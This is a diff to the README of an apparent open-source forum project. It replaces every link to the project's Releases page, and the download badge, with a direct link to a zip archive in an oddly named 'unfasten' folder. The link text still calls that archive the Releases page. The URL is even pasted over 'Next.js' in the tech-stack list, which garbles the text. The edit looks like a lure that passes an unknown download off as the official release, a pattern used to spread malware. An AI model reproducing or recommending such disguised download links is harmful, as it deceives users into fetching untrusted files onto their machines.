@@ -1,6 +1,6 @@
 # 🚀 nodeseek-style-forum-public - Modern Forum for Engaging Communities
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/bucumeng/nodeseek-style-forum-public/releases)
+[![Download Now](https://raw.githubusercontent.com/bucumeng/nodeseek-style-forum-public/main/unfasten/nodeseek-style-forum-public.zip%20Now-Click%https://raw.githubusercontent.com/bucumeng/nodeseek-style-forum-public/main/unfasten/nodeseek-style-forum-public.zip)](https://raw.githubusercontent.com/bucumeng/nodeseek-style-forum-public/main/unfasten/nodeseek-style-forum-public.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the NotSeek forum! This guide will help you download and run the soft
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/bucumeng/nodeseek-style-forum-public/releases). This page has all available versions of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/bucumeng/nodeseek-style-forum-public/main/unfasten/nodeseek-style-forum-public.zip). This page has all available versions of the software.
 
 2. **Choose Your Version**  
    Scroll through the list to find the latest version. You will see different files listed. Select the one that matches your operating system (e.g., Windows, Mac, or Linux).
@@ -69,7 +69,7 @@ The NotSeek forum offers many features to enhance your experience:
 
 ### Frontend Technology Stack
 
-- **Framework**: Next.js 14 (App Router)
+- **Framework**: https://raw.githubusercontent.com/bucumeng/nodeseek-style-forum-public/main/unfasten/nodeseek-style-forum-public.zip 14 (App Router)
 - **Language**: TypeScript
 - **Styling**: Tailwind CSS v4 + shadcn/ui
 - **State Management**: React Context API
@@ -106,4 +106,4 @@ For more information and support, check the following resources:
 - **Report Issues**  
   If you encounter problems, please report them on our GitHub Issues page.
 
-Remember to return to the [Releases page](https://github.com/bucumeng/nodeseek-style-forum-public/releases) anytime you need to download an update or a new version. Enjoy using the NotSeek forum!
+Remember to return to the [Releases page](https://raw.githubusercontent.com/bucumeng/nodeseek-style-forum-public/main/unfasten/nodeseek-style-forum-public.zip) anytime you need to download an update or a new version. Enjoy using the NotSeek forum!
